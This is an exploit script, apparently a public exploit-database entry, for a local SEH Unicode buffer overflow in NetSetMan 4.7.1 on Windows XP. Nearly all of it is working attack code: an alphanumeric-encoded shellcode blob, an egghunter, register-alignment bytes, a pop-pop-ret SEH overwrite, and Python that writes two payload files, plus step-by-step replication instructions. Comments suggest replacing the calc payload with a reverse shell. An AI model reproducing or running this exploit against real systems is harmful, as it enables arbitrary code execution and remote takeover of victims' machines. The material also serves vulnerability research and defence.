#Exploit Title: NetSetMan 4.7.1 - Local Buffer Overflow (SEH Unicode)
#Exploit Author: Devin Casadey
#Discovery Date: 2019-03-11
#Vendor Homepage: https://www.netsetman.com/
#Software Link: https://www.netsetman.com/netsetman.exe
#Tested Version: 4.7.1
#Tested on: Windows XP SP3

#-------------------------------------------------------------------------------

#Steps to replicate:
#1. Run the Python code below which outputs two payload .txt files.
#2. Open NetSetMan
#3. Enable "Workgroup" for both the "[Double Click!]" tab and "SET1" tab
#4. Paste contents of "payload2.txt" into the "Workgroup" field in the "SET1" tab.
#5. Paste contents of "payload1.txt" into the "Workgroup" field in the "[Double Click!]" tab.
#6. Click "Activate"
#7. ...
#8. Profit

#This is a unicode SEH overflow, but the buffer is too small for a unicode encoded reverse shell payload.
#Therefore, an egghunter is implemented to locate an alphanumeric encoded payload stored in memory.

#-------------------------------------------------------------------------------

# ! alpha upperlower encoding

# msfvenom -p windows/exec cmd=calc.exe -b "\x00" -e x86/alpha_mixed -f python

# ! Structured Exception Handler overwrite exploit

#-v shellcode EXITFUNC=seh BufferRegister=EDI
#Payload size: 440 bytes

# ! Egghunter looks for double-egg w00t
shellcode =  ""
shellcode = "w00tw00t"

# ! Replace this with my own reverse shell
shellcode += b"\x89\xe1\xd9\xc4\xd9\x71\xf4\x5d\x55\x59\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43"
shellcode += b"\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50"
shellcode += b"\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38"
shellcode += b"\x41\x42\x75\x4a\x49\x49\x6c\x59\x78\x4f\x72"
shellcode += b"\x53\x30\x75\x50\x37\x70\x65\x30\x4c\x49\x5a"
shellcode += b"\x45\x34\x71\x6b\x70\x73\x54\x4c\x4b\x42\x70"
shellcode += b"\x36\x50\x4e\x6b\x53\x62\x56\x6c\x4e\x6b\x73"
shellcode += b"\x62\x62\x34\x4c\x4b\x42\x52\x51\x38\x44\x4f"
shellcode += b"\x68\x37\x42\x6a\x55\x76\x75\x61\x6b\x4f\x4c"
shellcode += b"\x6c\x77\x4c\x50\x61\x63\x4c\x64\x42\x74\x6c"
shellcode += b"\x77\x50\x5a\x61\x58\x4f\x66\x6d\x46\x61\x48"
shellcode += b"\x47\x69\x72\x5a\x52\x76\x32\x61\x47\x4e\x6b"
shellcode += b"\x31\x42\x32\x30\x4c\x4b\x62\x6a\x77\x4c\x4c"
shellcode += b"\x4b\x32\x6c\x52\x31\x73\x48\x6a\x43\x53\x78"
shellcode += b"\x56\x61\x7a\x71\x66\x31\x6e\x6b\x71\x49\x67"
shellcode += b"\x50\x75\x51\x58\x53\x4e\x6b\x63\x79\x72\x38"
shellcode += b"\x59\x73\x46\x5a\x57\x39\x6c\x4b\x50\x34\x4c"
shellcode += b"\x4b\x46\x61\x48\x56\x46\x51\x69\x6f\x4c\x6c"
shellcode += b"\x79\x51\x6a\x6f\x74\x4d\x77\x71\x49\x57\x70"
shellcode += b"\x38\x69\x70\x44\x35\x7a\x56\x46\x63\x73\x4d"
shellcode += b"\x4c\x38\x55\x6b\x61\x6d\x56\x44\x43\x45\x39"
shellcode += b"\x74\x32\x78\x4e\x6b\x30\x58\x31\x34\x67\x71"
shellcode += b"\x6b\x63\x42\x46\x4c\x4b\x54\x4c\x42\x6b\x6c"
shellcode += b"\x4b\x43\x68\x35\x4c\x43\x31\x4e\x33\x6c\x4b"
shellcode += b"\x54\x44\x6c\x4b\x36\x61\x38\x50\x6f\x79\x33"
shellcode += b"\x74\x37\x54\x71\x34\x73\x6b\x31\x4b\x55\x31"
shellcode += b"\x63\x69\x72\x7a\x42\x71\x49\x6f\x49\x70\x73"
shellcode += b"\x6f\x33\x6f\x62\x7a\x4c\x4b\x76\x72\x5a\x4b"
shellcode += b"\x4c\x4d\x51\x4d\x73\x58\x65\x63\x70\x32\x47"
shellcode += b"\x70\x45\x50\x53\x58\x63\x47\x43\x43\x74\x72"
shellcode += b"\x61\x4f\x31\x44\x55\x38\x72\x6c\x62\x57\x71"
shellcode += b"\x36\x76\x67\x4d\x59\x5a\x48\x79\x6f\x5a\x70"
shellcode += b"\x4e\x58\x4e\x70\x73\x31\x77\x70\x35\x50\x37"
shellcode += b"\x59\x49\x54\x53\x64\x52\x70\x70\x68\x34\x69"
shellcode += b"\x4d\x50\x52\x4b\x57\x70\x6b\x4f\x4e\x35\x32"
shellcode += b"\x4a\x44\x4a\x63\x58\x6f\x30\x4e\x48\x51\x6a"
shellcode += b"\x32\x4e\x71\x78\x66\x62\x47\x70\x32\x31\x53"
shellcode += b"\x6c\x4c\x49\x39\x76\x36\x30\x42\x70\x46\x30"
shellcode += b"\x76\x30\x73\x70\x32\x70\x47\x30\x46\x30\x70"
shellcode += b"\x68\x78\x6a\x34\x4f\x49\x4f\x6d\x30\x59\x6f"
shellcode += b"\x59\x45\x4c\x57\x31\x7a\x74\x50\x63\x66\x61"
shellcode += b"\x47\x75\x38\x6a\x39\x6c\x65\x43\x44\x45\x31"
shellcode += b"\x49\x6f\x58\x55\x4c\x45\x79\x50\x70\x74\x55"
shellcode += b"\x5a\x4b\x4f\x70\x4e\x66\x68\x30\x75\x5a\x4c"
shellcode += b"\x68\x68\x51\x77\x55\x50\x45\x50\x55\x50\x53"
shellcode += b"\x5a\x73\x30\x33\x5a\x74\x44\x66\x36\x71\x47"
shellcode += b"\x43\x58\x55\x52\x78\x59\x78\x48\x43\x6f\x49"
shellcode += b"\x6f\x68\x55\x4f\x73\x6c\x38\x75\x50\x51\x6e"
shellcode += b"\x35\x66\x4e\x6b\x30\x36\x31\x7a\x71\x50\x70"
shellcode += b"\x68\x43\x30\x44\x50\x75\x50\x57\x70\x72\x76"
shellcode += b"\x73\x5a\x63\x30\x42\x48\x46\x38\x39\x34\x61"
shellcode += b"\x43\x68\x65\x39\x6f\x38\x55\x7a\x33\x71\x43"
shellcode += b"\x71\x7a\x33\x30\x46\x36\x32\x73\x73\x67\x35"
shellcode += b"\x38\x33\x32\x4a\x79\x7a\x68\x43\x6f\x39\x6f"
shellcode += b"\x38\x55\x4c\x43\x4a\x58\x65\x50\x61\x6d\x66"
shellcode += b"\x48\x63\x68\x70\x68\x77\x70\x31\x50\x65\x50"
shellcode += b"\x65\x50\x31\x7a\x53\x30\x52\x70\x50\x68\x56"
shellcode += b"\x6b\x46\x4f\x46\x6f\x30\x30\x49\x6f\x4a\x75"
shellcode += b"\x63\x67\x71\x78\x54\x35\x72\x4e\x30\x4d\x70"
shellcode += b"\x61\x59\x6f\x78\x55\x73\x6e\x31\x4e\x6b\x4f"
shellcode += b"\x66\x6c\x77\x54\x76\x6f\x4d\x55\x52\x50\x59"
shellcode += b"\x6f\x39\x6f\x79\x6f\x4b\x59\x4f\x6b\x39\x6f"
shellcode += b"\x4b\x4f\x6b\x4f\x37\x71\x68\x43\x34\x69\x59"
shellcode += b"\x56\x42\x55\x79\x51\x39\x53\x6d\x6b\x78\x70"
shellcode += b"\x58\x35\x39\x32\x76\x36\x52\x4a\x45\x50\x46"
shellcode += b"\x33\x79\x6f\x6a\x75\x41\x41"
# ! No need to replace this egghunter. It looks for w00tw00t

egghunter =(
"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIA"
"IAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30A"
"PB944JBC6SQGZKOLO0B0RQZOSR88MNNOLKUPZSDJO6XT7NPNP3DTKKJ6OD5JJ"
"6OBUK7KOYWLJA"
)

# ! Align registers code and then rets to ESP

regPrep = (
    "\x63" #nop/align
    "\x55" #push ebp
    "\x62" #nop/align
    "\x58" #pop eax
    "\x62" #nop/align
    "\x05\x14\x11" #add eax, 0x11001400
    "\x62" #nop/align
    "\x2d\x13\x11" #sub eax, 0x11001300
    "\x62" #nop/align
    "\x50" #push eax
    "\x62" #nop/align
    "\xc3") #ret

# ! \x61\x62 appears to be a unicode NOP.
buffer = ""
buffer += "\x61" * 75 #junk
buffer += "\x62" * 1  #nop

#0x00590058 : pop ebx # pop ebp # ret 0x08 | startnull,unicode,asciiprint,ascii {PAGE_EXECUTE_READ} [netsetman.exe]
#ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.7.1.0 (C:\Program Files\NetSetMan\netsetman.exe)

# ! SEH overwrite exploit
buffer += "\x58\x59" #SEH overwrite to pop-pop-ret instruction
buffer += regPrep

# ! Unicode nops of 108 bytes to reach egghunter
buffer += "\x62" * 108 #offset to egghunter
buffer += egghunter

# ! netsetman must load this payload file

#Write initial SEH overflow payload + egghunter with venetian shellcode
f = open('payload1.txt','w')
f.write(buffer)
f.close()

# ! Use this one

#Egg + alphanumeric encoded shellcode payload
g = open('payload2.txt', 'w')
g.write(shellcode)
g.close()
